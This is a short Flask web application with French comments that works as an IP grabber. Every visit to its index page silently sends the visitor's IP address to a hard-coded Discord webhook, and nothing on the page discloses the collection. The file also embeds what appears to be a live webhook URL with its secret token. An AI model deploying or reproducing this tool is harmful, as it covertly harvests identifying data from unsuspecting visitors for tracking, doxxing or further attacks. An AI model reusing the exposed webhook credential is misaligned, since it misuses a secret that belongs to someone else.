from flask import Flask, request, render_template
import requests

app = Flask(__name__)

# Remplacez 'VOTRE_WEBHOOK_URL' par l'URL réel de votre webhook Discord
WEBHOOK_URL = 'https://discord.com/api/webhooks/1189581246829957180/aRFpdCSf9AgfhrzGP0F5cjWxu1lG5-hlejBf3se-7BISIbx4VRS6aD-jiiy4BwpHgqZo'

@app.route('/')
def index():
    user_ip = request.remote_addr
    send_to_discord_webhook(user_ip)
    return render_template('index.html')

def send_to_discord_webhook(ip_address):
    payload = {
        'content': f"Adresse IP de l'utilisateur : {ip_address}"
    }
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print("Adresse IP envoyée avec succès au webhook Discord.")
        else:
            print(f"Erreur lors de l'envoi de l'adresse IP au webhook Discord. Code de statut : {response.status_code}")
    except Exception as e:
        print(f"Erreur lors de l'envoi de l'adresse IP au webhook Discord : {str(e)}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

